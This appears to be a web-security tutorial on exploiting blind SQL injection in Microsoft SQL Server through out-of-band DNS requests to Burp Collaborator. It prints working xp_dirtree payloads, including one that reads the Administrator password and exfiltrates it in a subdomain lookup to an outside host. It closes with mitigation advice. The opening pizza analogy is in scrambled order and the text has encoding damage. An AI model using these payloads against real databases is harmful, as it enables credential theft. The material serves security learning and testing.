# 21. Exploiting blind SQL injection using out-of-band (OAST) techniques

> â€œInstead of checking the appâ€™s response, you make the database send a network request to a server you control.â€
> 

This is what we mean by:

- They **used onions** âœ…
- They followed your instructions âœ…
- The chef got the message âœ…

So when your phone rings ğŸ“, you know:

> "If you're using onions, call me on my phone number."
> 

You secretly tell the **pizza chef** (the database):

### ğŸ¯ Instead of waiting for a response,

You can't get a response back from the app, so here's the trick:

## ğŸ’¡ OAST (Out-of-Band) Injection â€” The Pizza Analogy ğŸ•

---

This is like **blind SQL injection**. You can't see if your attack worked.

> âœ… "Request received", but never tells you what it did. No errors, no confirmation.
> 

Now imagine the app says:

## ğŸ”’ But What If There's No Response? (Blind SQLi)

---

This is like **normal SQL injection** â€” you inject a query and get a direct **response** in the app.

> âœ… "Pizza will be delivered in 30 minutes."
> 

The app responds:

> "I want 1 pizza, and tell me the status."
> 

Imagine you order a pizza using an app. You say:

## ğŸ”§ Problem: Blind SQL Injection with No Output

Youâ€™ve found a place in a web app where SQL injection is possible, but:

- The app doesnâ€™t show any error,
- No data is returned,
- You canâ€™t tell if your injection worked.

So, how do you confirm the injection is successful? ğŸ¤”

ğŸ‘‰ Use **OAST** â€” by making the **database connect back to your server** (e.g., via DNS).

---

## ğŸ§° Solution: Use **Burp Collaborator**

**Burp Collaborator** is a tool in **Burp Suite Professional** that lets you:

1. Generate a **unique domain name** (like `abcxyz.burpcollaborator.net`).
2. Watch for incoming requests (DNS, HTTP, SMTP, etc.) to that domain.
3. Confirm if your payload triggered a network request (even if the web app gives no response).

---

## ğŸ§ª Example with Microsoft SQL Server

### ğŸ’¥ The Injection Payload:

```sql
sql
CopyEdit
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This gets injected into a vulnerable parameter like:

```
http
CopyEdit
GET /product?id=1'; exec master..xp_dirtree '//your-collab-id.burpcollaborator.net/a'-- HTTP/1.1
```

### ğŸ§  What It Does:

- `xp_dirtree` is a **stored procedure** in Microsoft SQL Server that tries to **list the contents of a network path** (like a shared folder).
- When it runs, the database server sends a **DNS request** to resolve:
    
    ```
    CopyEdit
    0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
    
    ```
    
- That DNS request goes to Burp Collaborator's server.

---

## ğŸ“¡ Burp Collaborator Logs the Request

### You can now:

- Go to Burp Suite Professional > **Burp Collaborator client**
- Click **â€œPoll nowâ€**
- If you see your unique subdomain in the logs âœ…, your injection worked!

This proves:

- The SQL payload executed,
- You can even extract data using this channel (see next if you want to exfiltrate).

---

## ğŸ› ï¸ Why This Works

| Part | Purpose |
| --- | --- |
| `xp_dirtree` | Makes SQL Server perform a network call (trigger DNS lookup). |
| `burpcollaborator.net` | A domain you control via Burp â€” logs incoming requests. |
| Unique subdomain | Used to match which payload triggered the interaction. |

---

## ğŸ” Real-World Application

If you're testing a black-box app:

- You can't see backend code.
- You don't get SQL errors.
- But you can inject this payload and **listen for network signals** back to your domain.

This lets you:

- Confirm the injection.
- Leak information one bit at a time using subdomains (e.g., `adminpass1.burp...`, `adminpass2.burp...`, etc.).

---

## âœ… Summary

| Step | Action |
| --- | --- |
| 1ï¸âƒ£ | Get a unique subdomain from Burp Collaborator |
| 2ï¸âƒ£ | Inject it into the vulnerable parameter using an OAST SQL payload |
| 3ï¸âƒ£ | Wait for Burp to log DNS or HTTP requests |
| 4ï¸âƒ£ | If a request shows up â†’ you confirmed the vulnerability |

---

**Out-of-Band Application Security Testing (OAST)** is a powerful technique for detecting and exploiting **blind SQL injection vulnerabilities**, particularly when in-band methods are not effective or visible.

---

### ğŸ§ª Confirming Out-of-Band Interactions

Once you've confirmed the ability to trigger **out-of-band (OOB)** interactions (e.g., via DNS lookups), you can use this channel to **exfiltrate sensitive data** from the vulnerable application.

```sql
/cod';
DECLARE @p VARCHAR(1024);
SET @p = (SELECT password FROM users WHERE username = 'Administrator');
EXEC('master..xp_dirtree "//' + @p + '.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

- ğŸ§µ How It Works
    
    ### ğŸ§¨ Full Payload:
    
    ```sql
    '; 
    declare @p varchar(1024);
    set @p=(SELECT password FROM users WHERE username='Administrator');
    exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
    ```
    
    ### ğŸ§µ Step-by-Step Breakdown:
    
    1. **`';`**
        
        Closes the previous SQL query (typical SQL injection start).
        
    2. **`declare @p varchar(1024);`**
        
        Declares a variable `@p` to hold the password value.
        
    3. **`set @p=(SELECT password FROM users WHERE username='Administrator');`**
        
        Sets `@p` to the Administrator's password from the `users` table.
        
    4. **`exec('master..xp_dirtree "//'+@p+'.<unique-subdomain>.burpcollaborator.net/a"')`**
        - Dynamically builds and executes a command using SQL Server's `xp_dirtree`, a stored procedure that lists the contents of a directory.
        - In this case, it tries to access a network share:
            
            `\\<password>.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net\a`
            
        - This causes SQL Server to **attempt a DNS/SMB request to that domain** with the password embedded in the subdomain.
    5. **`-`**
        
        Comments out the rest of the original SQL query to avoid syntax errors.
        
    
    ---
    
    ### ğŸ›¡ï¸ What's the Goal?
    
    To **exfiltrate sensitive data (Administrator password)** through a **DNS or SMB request** to an external attacker-controlled domain, which is monitored using tools like **Burp Collaborator**.
    
    ---
    
    ### ğŸ”¥ Why Is It Dangerous?
    
    - **Data Exfiltration**: It sends credentials outside the network without needing a direct response.
    - **No Outbound Firewall Rule Needed**: Many internal SQL servers can perform outbound DNS/SMB requests.
    - **Abuses SQL Server Features**: `xp_dirtree` and similar procedures can be exploited if not disabled or restricted.

---

### ğŸ›°ï¸ Example Output

If the Administrator password is `S3cure`, the following DNS lookup is triggered:

```sql
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

This confirms:

- The vulnerability exists.
- Data has been successfully exfiltrated.

---

### ğŸ¯ Why Use OAST?

- âœ… **Works on Blind SQLi**: Even when no data is returned to the browser.
- âœ… **High Reliability**: Easy to verify via DNS logs or out-of-band listeners.
- âœ… **Flexible**: Applicable to a wide range of databases and environments.

---

### ğŸ› ï¸ Notes & Mitigation

- ğŸ”’ Always use **parameterized queries** to prevent SQL injection.
- ğŸ”Œ **Disable dangerous procedures** like `xp_dirtree` and `xp_cmdshell` unless explicitly required.
- ğŸ›¡ï¸ Implement **egress filtering** and **network segmentation** to block unauthorized outbound connections.
- ğŸ“œ For more methods and examples, refer to the **SQL Injection Cheat Sheet**.